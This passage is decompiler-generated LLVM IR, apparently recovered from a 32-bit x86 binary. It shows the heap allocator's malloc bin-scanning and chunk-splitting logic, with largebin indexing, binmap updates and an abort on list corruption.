  %stack_var_-40.0.ph = phi i32 [ %v2_804fda9, %dec_label_pc_804fda5 ], [ %v0_804fde0, %dec_label_pc_804fdf2 ], [ %v0_804fde0, %dec_label_pc_804fddc ]
  %v1_804fe2e = add i32 %v1_80500ea, 16
  %v0_804fed8107 = load i32, i32* @global_var_80604c0.229, align 64
  store i32 %v0_804fed8107, i32* @ebp, align 4
  %v9_804fede109 = icmp eq i32 %v0_804fed8107, 134612148
  %v1_804fee4110 = icmp eq i1 %v9_804fede109, false
  br i1 %v1_804fee4110, label %dec_label_pc_804fe07, label %dec_label_pc_804feea

dec_label_pc_804fe07:                             ; preds = %dec_label_pc_804fed8.preheader, %bb84
  %v0_804fed8111 = phi i32 [ %v0_804fed8, %bb84 ], [ %v0_804fed8107, %dec_label_pc_804fed8.preheader ]
  %v1_804fe07 = add i32 %v0_804fed8111, 4
  %v2_804fe07 = inttoptr i32 %v1_804fe07 to i32*
  %v3_804fe07 = load i32, i32* %v2_804fe07, align 4
  %v1_804fe0a = add i32 %v0_804fed8111, 12
  %v2_804fe0a = inttoptr i32 %v1_804fe0a to i32*
  %v3_804fe0a = load i32, i32* %v2_804fe0a, align 4
  store i32 %v3_804fe0a, i32* @edx, align 4
  %v1_804fe0d = and i32 %v3_804fe07, -4
  store i32 %v1_804fe0d, i32* @edi, align 4
  br i1 %v6_804fda3, label %dec_label_pc_804fe39, label %dec_label_pc_804fe1a

dec_label_pc_804fe1a:                             ; preds = %dec_label_pc_804fe07
  %v9_804fe1a = icmp eq i32 %v3_804fe0a, 134612148
  %v1_804fe20 = icmp eq i1 %v9_804fe1a, false
  br i1 %v1_804fe20, label %dec_label_pc_804fe39, label %dec_label_pc_804fe22

dec_label_pc_804fe22:                             ; preds = %dec_label_pc_804fe1a
  %v1_804fe22 = load i32, i32* @global_var_80604b0.227, align 16
  %v12_804fe22 = icmp eq i32 %v0_804fed8111, %v1_804fe22
  %v1_804fe28 = icmp eq i1 %v12_804fe22, false
  br i1 %v1_804fe28, label %dec_label_pc_804fe39, label %dec_label_pc_804fe2a

dec_label_pc_804fe2a:                             ; preds = %dec_label_pc_804fe22
  store i32 %v1_804fe2e, i32* %eax.global-to-local, align 4
  %v6_804fe33 = icmp ugt i32 %v1_804fe0d, %v1_804fe2e
  br i1 %v6_804fe33, label %dec_label_pc_80503ea, label %dec_label_pc_804fe39

dec_label_pc_804fe39:                             ; preds = %dec_label_pc_804fe2a, %dec_label_pc_804fe22, %dec_label_pc_804fe1a, %dec_label_pc_804fe07
  store i32 ptrtoint (i32* @global_var_80604b4.228 to i32), i32* %eax.global-to-local, align 4
  %v2_804fe3e = add i32 %v3_804fe0a, 8
  %v3_804fe3e = inttoptr i32 %v2_804fe3e to i32*
  store i32 ptrtoint (i32* @global_var_80604b4.228 to i32), i32* %v3_804fe3e, align 4
  %v0_804fe41 = load i32, i32* @edx, align 4
  store i32 %v0_804fe41, i32* @global_var_80604c0.229, align 4
  %v0_804fe44 = load i32, i32* @edi, align 4
  %v15_804fe44 = icmp eq i32 %v0_804fe44, %v1_80500ea
  br i1 %v15_804fe44, label %dec_label_pc_805042b, label %dec_label_pc_804fe4e

dec_label_pc_804fe4e:                             ; preds = %dec_label_pc_804fe39
  %v6_804fe54 = icmp ugt i32 %v0_804fe44, 255
  br i1 %v6_804fe54, label %dec_label_pc_804fe67, label %dec_label_pc_804fe56

dec_label_pc_804fe56:                             ; preds = %dec_label_pc_804fe4e
  %v2_804fe58 = udiv i32 %v0_804fe44, 8
  store i32 %v2_804fe58, i32* %esi.global-to-local, align 4
  %v1_804fe5b = mul nuw i32 %v2_804fe58, 8
  %v2_804fe5b = add i32 %v1_804fe5b, 134612140
  store i32 %v2_804fe5b, i32* @ebx, align 4
  %v1_804fe62 = add i32 %v1_804fe5b, 134612148
  %v2_804fe62 = inttoptr i32 %v1_804fe62 to i32*
  %v3_804fe62 = load i32, i32* %v2_804fe62, align 4
  store i32 %v3_804fe62, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804feb0

dec_label_pc_804fe67:                             ; preds = %dec_label_pc_804fe4e
  store i32 %v0_804fe44, i32* @eax, align 4
  %v0_804fe69 = call i32 @__malloc_largebin_index()
  store i32 %v0_804fe69, i32* %esi.global-to-local, align 4
  %v1_804fe70 = mul i32 %v0_804fe69, 8
  %v2_804fe70 = add i32 %v1_804fe70, ptrtoint (i32* @global_var_80604ac.226 to i32)
  store i32 %v2_804fe70, i32* %eax.global-to-local, align 4
  %v1_804fe77 = add i32 %v1_804fe70, add (i32 ptrtoint (i32* @global_var_80604ac.226 to i32), i32 8)
  %v2_804fe77 = inttoptr i32 %v1_804fe77 to i32*
  %v3_804fe77 = load i32, i32* %v2_804fe77, align 4
  store i32 %v3_804fe77, i32* %edx.global-to-local, align 4
  store i32 %v3_804fe77, i32* @ebx, align 4
  %v12_804fe80 = icmp eq i32 %v3_804fe77, %v2_804fe70
  br i1 %v12_804fe80, label %dec_label_pc_804feb0, label %dec_label_pc_804fe84

dec_label_pc_804fe84:                             ; preds = %dec_label_pc_804fe67
  %v1_804fe84 = add i32 %v1_804fe70, add (i32 ptrtoint (i32* @global_var_80604ac.226 to i32), i32 12)
  %v2_804fe84 = inttoptr i32 %v1_804fe84 to i32*
  %v3_804fe84 = load i32, i32* %v2_804fe84, align 4
  store i32 %v3_804fe84, i32* @ebx, align 4
  %v0_804fe87 = load i32, i32* @edi, align 4
  %v2_804fe87 = add i32 %v3_804fe84, 4
  %v3_804fe87 = inttoptr i32 %v2_804fe87 to i32*
  %v4_804fe87 = load i32, i32* %v3_804fe87, align 4
  %v10_804fe87 = icmp ult i32 %v0_804fe87, %v4_804fe87
  %v1_804fe8a = icmp eq i1 %v10_804fe87, false
  br i1 %v1_804fe8a, label %dec_label_pc_804fe92, label %dec_label_pc_804feb0

dec_label_pc_804fe92:                             ; preds = %dec_label_pc_804fe84
  %v1_804fe94 = or i32 %v0_804fe87, 1
  store i32 %v1_804fe94, i32* %eax.global-to-local, align 4
  store i32 %v3_804fe77, i32* %ebx.global-to-local, align 4
  %v2_804fea8101 = add i32 %v3_804fe77, 4
  %v3_804fea8102 = inttoptr i32 %v2_804fea8101 to i32*
  %v4_804fea8103 = load i32, i32* %v3_804fea8102, align 4
  %v10_804fea8104 = icmp ult i32 %v1_804fe94, %v4_804fea8103
  br i1 %v10_804fea8104, label %dec_label_pc_804fe99, label %dec_label_pc_804fead

dec_label_pc_804fe99:                             ; preds = %dec_label_pc_804fe92, %dec_label_pc_804fe99
  %v0_804fead105 = phi i32 [ %v3_804fe9d, %dec_label_pc_804fe99 ], [ %v3_804fe77, %dec_label_pc_804fe92 ]
  store i32 %v0_804fead105, i32* %ecx.global-to-local, align 4
  %v1_804fe9d = add i32 %v0_804fead105, 8
  %v2_804fe9d = inttoptr i32 %v1_804fe9d to i32*
  %v3_804fe9d = load i32, i32* %v2_804fe9d, align 4
  store i32 %v3_804fe9d, i32* %ecx.global-to-local, align 4
  store i32 %v3_804fe9d, i32* %ebx.global-to-local, align 4
  %v2_804fea8 = add i32 %v3_804fe9d, 4
  %v3_804fea8 = inttoptr i32 %v2_804fea8 to i32*
  %v4_804fea8 = load i32, i32* %v3_804fea8, align 4
  %v10_804fea8 = icmp ult i32 %v1_804fe94, %v4_804fea8
  br i1 %v10_804fea8, label %dec_label_pc_804fe99, label %dec_label_pc_804fead

dec_label_pc_804fead:                             ; preds = %dec_label_pc_804fe99, %dec_label_pc_804fe92
  %v0_804fead.lcssa = phi i32 [ %v3_804fe77, %dec_label_pc_804fe92 ], [ %v3_804fe9d, %dec_label_pc_804fe99 ]
  %v1_804fead = add i32 %v0_804fead.lcssa, 12
  %v2_804fead = inttoptr i32 %v1_804fead to i32*
  %v3_804fead = load i32, i32* %v2_804fead, align 4
  store i32 %v3_804fead, i32* @ebx, align 4
  br label %dec_label_pc_804feb0

dec_label_pc_804feb0:                             ; preds = %dec_label_pc_804fe56, %dec_label_pc_804fe84, %dec_label_pc_804fe67, %dec_label_pc_804fead
  %v0_804feb0 = phi i32 [ %v0_804fe69, %dec_label_pc_804fe67 ], [ %v0_804fe69, %dec_label_pc_804fead ], [ %v0_804fe69, %dec_label_pc_804fe84 ], [ %v2_804fe58, %dec_label_pc_804fe56 ]
  %stack_var_-64.1 = phi i32 [ %v2_804fe70, %dec_label_pc_804fe67 ], [ %v0_804fead.lcssa, %dec_label_pc_804fead ], [ %v2_804fe70, %dec_label_pc_804fe84 ], [ %v3_804fe62, %dec_label_pc_804fe56 ]
  %v1_804feb2 = urem i32 %v0_804feb0, 32
  %v2_804feb2 = icmp eq i32 %v1_804feb2, 0
  store i32 %v1_804feb2, i32* %esi.global-to-local, align 4
  store i32 %v1_804feb2, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804febc = sdiv i32 %v0_804feb0, 32
  store i32 %v2_804febc, i32* %edx.global-to-local, align 4
  br i1 %v2_804feb2, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804feb0
  %v5_804febf = shl i32 1, %v1_804feb2
  store i32 %v5_804febf, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_804feb0, %bb
  %v5_804fec1 = phi i32 [ 1, %dec_label_pc_804feb0 ], [ %v5_804febf, %bb ]
  %v1_804fec1 = mul nsw i32 %v2_804febc, 4
  %v2_804fec1 = add i32 %v1_804fec1, ptrtoint (i32* @global_var_80607b4.230 to i32)
  %v3_804fec1 = inttoptr i32 %v2_804fec1 to i32*
  %v4_804fec1 = load i32, i32* %v3_804fec1, align 4
  %v6_804fec1 = or i32 %v4_804fec1, %v5_804fec1
  store i32 %v6_804fec1, i32* %v3_804fec1, align 4
  %v0_804fec8 = load i32, i32* @ebx, align 4
  %v1_804fec8 = load i32, i32* @ebp, align 4
  %v2_804fec8 = add i32 %v1_804fec8, 12
  %v3_804fec8 = inttoptr i32 %v2_804fec8 to i32*
  store i32 %v0_804fec8, i32* %v3_804fec8, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804fecf = load i32, i32* @ebp, align 4
  %v2_804fecf = add i32 %v1_804fecf, 8
  %v3_804fecf = inttoptr i32 %v2_804fecf to i32*
  store i32 %stack_var_-64.1, i32* %v3_804fecf, align 4
  %v0_804fed2 = load i32, i32* @ebp, align 4
  %v1_804fed2 = load i32, i32* @ebx, align 4
  %v2_804fed2 = add i32 %v1_804fed2, 8
  %v3_804fed2 = inttoptr i32 %v2_804fed2 to i32*
  store i32 %v0_804fed2, i32* %v3_804fed2, align 4
  %v0_804fed5 = load i32, i32* @ebp, align 4
  %v1_804fed5 = load i32, i32* @esi, align 4
  %v2_804fed5 = add i32 %v1_804fed5, 12
  %v3_804fed5 = inttoptr i32 %v2_804fed5 to i32*
  store i32 %v0_804fed5, i32* %v3_804fed5, align 4
  %v0_804fed8 = load i32, i32* @global_var_80604c0.229, align 64
  store i32 %v0_804fed8, i32* @ebp, align 4
  %v9_804fede = icmp eq i32 %v0_804fed8, 134612148
  %v1_804fee4 = icmp eq i1 %v9_804fede, false
  br i1 %v1_804fee4, label %dec_label_pc_804fe07, label %dec_label_pc_804feea

dec_label_pc_804feea:                             ; preds = %bb84, %dec_label_pc_804fed8.preheader
  br i1 %v8_804fd9b, label %dec_label_pc_804ff78, label %dec_label_pc_804fef8

dec_label_pc_804fef8:                             ; preds = %dec_label_pc_804feea
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804fefc = mul i32 %stack_var_-40.0.ph, 8
  %v2_804fefc = add i32 %v1_804fefc, ptrtoint (i32* @global_var_80604ac.226 to i32)
  store i32 %v2_804fefc, i32* %edx.global-to-local, align 4
  %v1_804ff03 = add i32 %v1_804fefc, add (i32 ptrtoint (i32* @global_var_80604ac.226 to i32), i32 12)
  %v2_804ff03 = inttoptr i32 %v1_804ff03 to i32*
  %storemerge1.pre = load i32, i32* %v2_804ff03, align 4
  br label %dec_label_pc_804ff74

dec_label_pc_804ff08:                             ; preds = %dec_label_pc_804ff74
  %v1_804ff08 = add i32 %v4_804ff1f, 4
  %v2_804ff08 = inttoptr i32 %v1_804ff08 to i32*
  %v3_804ff08 = load i32, i32* %v2_804ff08, align 4
  store i32 %v3_804ff08, i32* %ebx.global-to-local, align 4
  %v1_804ff0b = add i32 %v4_804ff1f, 12
  %v2_804ff0b = inttoptr i32 %v1_804ff0b to i32*
  %v3_804ff0b = load i32, i32* %v2_804ff0b, align 4
  store i32 %v3_804ff0b, i32* @ecx, align 4
  %v1_804ff0e = and i32 %v3_804ff08, -4
  store i32 %v1_804ff0e, i32* @ebx, align 4
  %v10_804ff11 = icmp ult i32 %v1_804ff0e, %v1_80500ea
  br i1 %v10_804ff11, label %dec_label_pc_804ff74, label %dec_label_pc_804ff17

dec_label_pc_804ff17:                             ; preds = %dec_label_pc_804ff08
  %v1_804ff17 = add i32 %v4_804ff1f, 8
  %v2_804ff17 = inttoptr i32 %v1_804ff17 to i32*
  %v3_804ff17 = load i32, i32* %v2_804ff17, align 4
  store i32 %v3_804ff17, i32* @edx, align 4
  %v1_804ff1a = add i32 %v3_804ff17, 12
  %v2_804ff1a = inttoptr i32 %v1_804ff1a to i32*
  %v3_804ff1a = load i32, i32* %v2_804ff1a, align 4
  %v15_804ff1a = icmp eq i32 %v3_804ff1a, %v4_804ff1f
  %v1_804ff1d = icmp eq i1 %v15_804ff1a, false
  br i1 %v1_804ff1d, label %dec_label_pc_804ff24, label %dec_label_pc_804ff1f

dec_label_pc_804ff1f:                             ; preds = %dec_label_pc_804ff17
  %v1_804ff1f = add i32 %v3_804ff0b, 8
  %v2_804ff1f = inttoptr i32 %v1_804ff1f to i32*
  %v3_804ff1f = load i32, i32* %v2_804ff1f, align 4
  %v15_804ff1f = icmp eq i32 %v3_804ff1f, %v4_804ff1f
  br i1 %v15_804ff1f, label %dec_label_pc_804ff29, label %dec_label_pc_804ff24

dec_label_pc_804ff24:                             ; preds = %dec_label_pc_804ff1f, %dec_label_pc_804ff17
  %v0_804ff24 = call i32 @abort()
  store i32 %v0_804ff24, i32* %eax.global-to-local, align 4
  %v0_804ff29.pre = load i32, i32* @ebx, align 4
  %v0_804ff2f.pre = load i32, i32* @ecx, align 4
  %v1_804ff2f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ff29

dec_label_pc_804ff29:                             ; preds = %dec_label_pc_804ff1f, %dec_label_pc_804ff24
  %v1_804ff2f = phi i32 [ %v3_804ff17, %dec_label_pc_804ff1f ], [ %v1_804ff2f.pre, %dec_label_pc_804ff24 ]
  %v0_804ff2f = phi i32 [ %v3_804ff0b, %dec_label_pc_804ff1f ], [ %v0_804ff2f.pre, %dec_label_pc_804ff24 ]
  %v0_804ff29 = phi i32 [ %v1_804ff0e, %dec_label_pc_804ff1f ], [ %v0_804ff29.pre, %dec_label_pc_804ff24 ]
  %v5_804ff2b = sub i32 %v0_804ff29, %v1_80500ea
  store i32 %v5_804ff2b, i32* %esi.global-to-local, align 4
  %v2_804ff2f = add i32 %v1_804ff2f, 12
  %v3_804ff2f = inttoptr i32 %v2_804ff2f to i32*
  store i32 %v0_804ff2f, i32* %v3_804ff2f, align 4
  %v0_804ff32 = load i32, i32* @edx, align 4
  %v1_804ff32 = load i32, i32* @ecx, align 4
  %v2_804ff32 = add i32 %v1_804ff32, 8
  %v3_804ff32 = inttoptr i32 %v2_804ff32 to i32*
  store i32 %v0_804ff32, i32* %v3_804ff32, align 4
  %v0_804ff35 = load i32, i32* %esi.global-to-local, align 4
  %v0_804ff38 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ff38 = add i32 %v0_804ff38, 8
  store i32 %v1_804ff38, i32* @ecx, align 4
  %tmp127 = icmp ult i32 %v0_804ff35, 16
  br i1 %tmp127, label %dec_label_pc_8050439, label %dec_label_pc_804ff41

dec_label_pc_804ff41:                             ; preds = %dec_label_pc_804ff29
  %v2_804ff45 = add i32 %v0_804ff38, %v1_80500ea
  store i32 %v2_804ff45, i32* @edx, align 4
  %v1_804ff48 = or i32 %v1_80500ea, 1
  store i32 %v1_804ff48, i32* %ebx.global-to-local, align 4
  %v2_804ff4b = add i32 %v0_804ff38, 4
  %v3_804ff4b = inttoptr i32 %v2_804ff4b to i32*
  store i32 %v1_804ff48, i32* %v3_804ff4b, align 4
  %v0_804ff4e = load i32, i32* %esi.global-to-local, align 4
  %v1_804ff50 = or i32 %v0_804ff4e, 1
  store i32 %v1_804ff50, i32* %eax.global-to-local, align 4
  %v0_804ff53 = load i32, i32* @edx, align 4
  %v1_804ff53 = load i32, i32* @ebp, align 4
  %v2_804ff53 = add i32 %v1_804ff53, 8
  %v3_804ff53 = inttoptr i32 %v2_804ff53 to i32*
  store i32 %v0_804ff53, i32* %v3_804ff53, align 4
  %v0_804ff56 = load i32, i32* @edx, align 4
  %v1_804ff56 = load i32, i32* @ebp, align 4
  %v2_804ff56 = add i32 %v1_804ff56, 12
  %v3_804ff56 = inttoptr i32 %v2_804ff56 to i32*
  store i32 %v0_804ff56, i32* %v3_804ff56, align 4
  %v0_804ff59 = load i32, i32* @edx, align 4
  %v1_804ff59 = add i32 %v0_804ff59, 8
  %v2_804ff59 = inttoptr i32 %v1_804ff59 to i32*
  store i32 ptrtoint (i32* @global_var_80604b4.228 to i32), i32* %v2_804ff59, align 4
  %v0_804ff60 = load i32, i32* @edx, align 4
  %v1_804ff60 = add i32 %v0_804ff60, 12
  %v2_804ff60 = inttoptr i32 %v1_804ff60 to i32*
  store i32 ptrtoint (i32* @global_var_80604b4.228 to i32), i32* %v2_804ff60, align 4
  %v0_804ff67 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ff67 = load i32, i32* @edx, align 4
  %v2_804ff67 = add i32 %v1_804ff67, 4
  %v3_804ff67 = inttoptr i32 %v2_804ff67 to i32*
  store i32 %v0_804ff67, i32* %v3_804ff67, align 4
  %v0_804ff6a = load i32, i32* %esi.global-to-local, align 4
  %v1_804ff6a = load i32, i32* @edx, align 4
  %v3_804ff6a = add i32 %v1_804ff6a, %v0_804ff6a
  %v4_804ff6a = inttoptr i32 %v3_804ff6a to i32*
  store i32 %v0_804ff6a, i32* %v4_804ff6a, align 4
  br label %dec_label_pc_805043e

dec_label_pc_804ff74:                             ; preds = %dec_label_pc_804ff08, %dec_label_pc_804fef8
  %v4_804ff1f = phi i32 [ %storemerge1.pre, %dec_label_pc_804fef8 ], [ %v3_804ff0b, %dec_label_pc_804ff08 ]
  store i32 %v4_804ff1f, i32* %eax.global-to-local, align 4
  %v12_804ff74 = icmp eq i32 %v4_804ff1f, %v2_804fefc
  %v1_804ff76 = icmp eq i1 %v12_804ff74, false
  br i1 %v1_804ff76, label %dec_label_pc_804ff08, label %dec_label_pc_804ff78.loopexit

dec_label_pc_804ff78.loopexit:                    ; preds = %dec_label_pc_804ff74
  br label %dec_label_pc_804ff78

dec_label_pc_804ff78:                             ; preds = %dec_label_pc_804ff78.loopexit, %dec_label_pc_804feea
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804ff81 = add i32 %stack_var_-40.0.ph, 1
  %v2_804ff84 = udiv i32 %v1_804ff81, 32
  store i32 %v2_804ff84, i32* @edi, align 4
  %v1_804ff87 = mul i32 %v1_804ff81, 8
  %v2_804ff87 = add i32 %v1_804ff87, ptrtoint (i32* @global_var_80604ac.226 to i32)
  store i32 %v2_804ff87, i32* %ebx.global-to-local, align 4
  %v1_804ff8e = urem i32 %v1_804ff81, 32
  %v2_804ff8e = icmp eq i32 %v1_804ff8e, 0
  store i32 %v1_804ff8e, i32* %ecx.global-to-local, align 4
  %v1_804ff91 = mul nuw nsw i32 %v2_804ff84, 4
  %v2_804ff91 = add i32 %v1_804ff91, ptrtoint (i32* @global_var_80607b4.230 to i32)
  %v3_804ff91 = inttoptr i32 %v2_804ff91 to i32*
  %v4_804ff91 = load i32, i32* %v3_804ff91, align 4
  store i32 %v4_804ff91, i32* %edx.global-to-local, align 4
  br i1 %v2_804ff8e, label %.preheader, label %bb85

bb85:                                             ; preds = %dec_label_pc_804ff78
  %v5_804ff98 = shl i32 1, %v1_804ff8e
  store i32 %v5_804ff98, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804ff78, %bb85, %dec_label_pc_804ffd9
  %v1_804ff9a = phi i32 [ %v1_804ff9a.pre, %dec_label_pc_804ffd9 ], [ %v4_804ff91, %bb85 ], [ %v4_804ff91, %dec_label_pc_804ff78 ]
  %v0_804ff9e = phi i32 [ %v0_804ff9a.pre, %dec_label_pc_804ffd9 ], [ %v5_804ff98, %bb85 ], [ 1, %dec_label_pc_804ff78 ]
  %tmp86 = icmp ule i32 %v0_804ff9e, %v1_804ff9a
  %v1_804ff9e = icmp eq i32 %v0_804ff9e, 0
  %v1_804ffa0 = icmp eq i1 %v1_804ff9e, false
  %or.cond = and i1 %tmp86, %v1_804ffa0
  br i1 %or.cond, label %dec_label_pc_804ff9e.dec_label_pc_804ffce.preheader_crit_edge, label %dec_label_pc_804ffa2.preheader

dec_label_pc_804ff9e.dec_label_pc_804ffce.preheader_crit_edge: ; preds = %.preheader
  %v0_804ffc912.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ffce.preheader

dec_label_pc_804ffa2.preheader:                   ; preds = %.preheader
  %v0_804ffa2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804ffa2

dec_label_pc_804ffa2:                             ; preds = %dec_label_pc_804ffa2.preheader, %dec_label_pc_804ffac
  %v0_804ffa2 = phi i32 [ %v0_804ffa2.pre, %dec_label_pc_804ffa2.preheader ], [ %v1_804ffa2, %dec_label_pc_804ffac ]
  %v1_804ffa2 = add i32 %v0_804ffa2, 1
  store i32 %v1_804ffa2, i32* @edi, align 4
  %v6_804ffa6 = icmp ugt i32 %v1_804ffa2, 2
  br i1 %v6_804ffa6, label %dec_label_pc_8050055.loopexit, label %dec_label_pc_804ffac

dec_label_pc_804ffac:                             ; preds = %dec_label_pc_804ffa2
  %v1_804ffac = mul i32 %v1_804ffa2, 4
  %v2_804ffac = add i32 %v1_804ffac, ptrtoint (i32* @global_var_80607b4.230 to i32)
  %v3_804ffac = inttoptr i32 %v2_804ffac to i32*
  %v4_804ffac = load i32, i32* %v3_804ffac, align 4
  store i32 %v4_804ffac, i32* %edx.global-to-local, align 4
  %v1_804ffb3 = icmp eq i32 %v4_804ffac, 0
  br i1 %v1_804ffb3, label %dec_label_pc_804ffa2, label %dec_label_pc_804ffb7

dec_label_pc_804ffb7:                             ; preds = %dec_label_pc_804ffac
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_804ffbe = mul i32 %v1_804ffa2, 256
  store i32 %v2_804ffbe, i32* %eax.global-to-local, align 4
  %v1_804ffc1 = add i32 %v2_804ffbe, ptrtoint (i32* @global_var_80604ac.226 to i32)
  store i32 %v1_804ffc1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ffce.preheader

dec_label_pc_804ffce.preheader:                   ; preds = %dec_label_pc_804ff9e.dec_label_pc_804ffce.preheader_crit_edge, %dec_label_pc_804ffb7
  %v0_804ffc912 = phi i32 [ %v1_804ffc1, %dec_label_pc_804ffb7 ], [ %v0_804ffc912.pre, %dec_label_pc_804ff9e.dec_label_pc_804ffce.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_804ffb7 ], [ %v0_804ff9e, %dec_label_pc_804ff9e.dec_label_pc_804ffce.preheader_crit_edge ]
  %v0_804ffe0 = phi i32 [ %v4_804ffac, %dec_label_pc_804ffb7 ], [ %v1_804ff9a, %dec_label_pc_804ff9e.dec_label_pc_804ffce.preheader_crit_edge ]
  %v2_804ffce4 = and i32 %v0_804ffe0, %esi.promoted
  %v3_804ffce5 = icmp eq i32 %v2_804ffce4, 0
  br i1 %v3_804ffce5, label %dec_label_pc_804ffc9, label %dec_label_pc_804ffd2

dec_label_pc_804ffc9:                             ; preds = %dec_label_pc_804ffce.preheader, %dec_label_pc_804ffc9
  %v2_804ffcc14 = phi i32 [ %v2_804ffcc, %dec_label_pc_804ffc9 ], [ %esi.promoted, %dec_label_pc_804ffce.preheader ]
  %v0_804ffc913 = phi i32 [ %v1_804ffc9, %dec_label_pc_804ffc9 ], [ %v0_804ffc912, %dec_label_pc_804ffce.preheader ]
  %v1_804ffc9 = add i32 %v0_804ffc913, 8
  %v2_804ffcc = mul i32 %v2_804ffcc14, 2
  %v2_804ffce = and i32 %v2_804ffcc, %v0_804ffe0
  %v3_804ffce = icmp eq i32 %v2_804ffce, 0
  br i1 %v3_804ffce, label %dec_label_pc_804ffc9, label %dec_label_pc_804ffce.dec_label_pc_804ffd2_crit_edge

dec_label_pc_804ffce.dec_label_pc_804ffd2_crit_edge: ; preds = %dec_label_pc_804ffc9
  store i32 %v1_804ffc9, i32* %ebx.global-to-local, align 4
  store i32 %v2_804ffcc, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ffd2

dec_label_pc_804ffd2:                             ; preds = %dec_label_pc_804ffce.dec_label_pc_804ffd2_crit_edge, %dec_label_pc_804ffce.preheader
  %v0_804ffe2 = phi i32 [ %v2_804ffcc, %dec_label_pc_804ffce.dec_label_pc_804ffd2_crit_edge ], [ %esi.promoted, %dec_label_pc_804ffce.preheader ]
  %v1_804fffc = phi i32 [ %v1_804ffc9, %dec_label_pc_804ffce.dec_label_pc_804ffd2_crit_edge ], [ %v0_804ffc912, %dec_label_pc_804ffce.preheader ]
  %v1_804ffd2 = add i32 %v1_804fffc, 12
  %v2_804ffd2 = inttoptr i32 %v1_804ffd2 to i32*
  %v3_804ffd2 = load i32, i32* %v2_804ffd2, align 4
  store i32 %v3_804ffd2, i32* @ecx, align 4
  %v12_804ffd5 = icmp eq i32 %v3_804ffd2, %v1_804fffc
  %v1_804ffd7 = icmp eq i1 %v12_804ffd5, false
  br i1 %v1_804ffd7, label %dec_label_pc_804ffed, label %dec_label_pc_804ffd9

dec_label_pc_804ffd9:                             ; preds = %dec_label_pc_804ffd2
  %v1_804ffdb = add i32 %v3_804ffd2, 8
  store i32 %v1_804ffdb, i32* %ebx.global-to-local, align 4
  %v1_804ffde = sub i32 -1, %v0_804ffe2
  store i32 %v1_804ffde, i32* %eax.global-to-local, align 4
  %v2_804ffe0 = and i32 %v0_804ffe0, %v1_804ffde
  store i32 %v2_804ffe0, i32* %edx.global-to-local, align 4
  %v2_804ffe2 = mul i32 %v0_804ffe2, 2
  store i32 %v2_804ffe2, i32* %esi.global-to-local, align 4
  %v1_804ffe4 = load i32, i32* @edi, align 4
  %v2_804ffe4 = mul i32 %v1_804ffe4, 4
  %v3_804ffe4 = add i32 %v2_804ffe4, ptrtoint (i32* @global_var_80607b4.230 to i32)
  %v4_804ffe4 = inttoptr i32 %v3_804ffe4 to i32*
  store i32 %v2_804ffe0, i32* %v4_804ffe4, align 4
  %v0_804ff9a.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804ff9a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_804ffed:                             ; preds = %dec_label_pc_804ffd2
  %v1_804ffed = add i32 %v3_804ffd2, 4
  %v2_804ffed = inttoptr i32 %v1_804ffed to i32*
  %v3_804ffed = load i32, i32* %v2_804ffed, align 4
  store i32 %v3_804ffed, i32* %edx.global-to-local, align 4
  %v1_804fff0 = add i32 %v3_804ffd2, 12
  %v2_804fff0 = inttoptr i32 %v1_804fff0 to i32*
  %v3_804fff0 = load i32, i32* %v2_804fff0, align 4
  store i32 %v3_804fff0, i32* %eax.global-to-local, align 4
  %v1_804fff3 = and i32 %v3_804ffed, -4
  store i32 %v1_804fff3, i32* @edx, align 4
  %v5_804fff8 = sub i32 %v1_804fff3, %v1_80500ea
  store i32 %v5_804fff8, i32* %esi.global-to-local, align 4
  store i32 %v3_804fff0, i32* %v2_804ffd2, align 4
  %v0_804ffff = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ffff = load i32, i32* %eax.global-to-local, align 4
  %v2_804ffff = add i32 %v1_804ffff, 8
  %v3_804ffff = inttoptr i32 %v2_804ffff to i32*
  store i32 %v0_804ffff, i32* %v3_804ffff, align 4
  %v0_8050002 = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_8050002, 16
  br i1 %tmp128, label %dec_label_pc_8050007, label %dec_label_pc_805000e

dec_label_pc_8050007:                             ; preds = %dec_label_pc_804ffed
  %v0_8050007 = load i32, i32* @ecx, align 4
  %v1_8050007 = load i32, i32* @edx, align 4
  %v2_8050007 = add i32 %v0_8050007, 4
  %v3_8050007 = add i32 %v2_8050007, %v1_8050007
  %v4_8050007 = inttoptr i32 %v3_8050007 to i32*
  %v5_8050007 = load i32, i32* %v4_8050007, align 4
  %v6_8050007 = or i32 %v5_8050007, 1
  store i32 %v6_8050007, i32* %v4_8050007, align 4
  br label %dec_label_pc_805004d

dec_label_pc_805000e:                             ; preds = %dec_label_pc_804ffed
  store i32 %v1_80500ea, i32* %eax.global-to-local, align 4
  %v0_8050017 = load i32, i32* @ecx, align 4
  %v2_8050017 = add i32 %v0_8050017, %v1_80500ea
  store i32 %v2_8050017, i32* @edx, align 4
  %v1_805001a = load i32, i32* @ebp, align 4
  %v2_805001a = add i32 %v1_805001a, 8
  %v3_805001a = inttoptr i32 %v2_805001a to i32*
  store i32 %v2_8050017, i32* %v3_805001a, align 4
  %v0_805001d = load i32, i32* @edx, align 4
  %v1_805001d = load i32, i32* @ebp, align 4
  %v2_805001d = add i32 %v1_805001d, 12
  %v3_805001d = inttoptr i32 %v2_805001d to i32*
  store i32 %v0_805001d, i32* %v3_805001d, align 4
  %v0_8050020 = load i32, i32* @edx, align 4
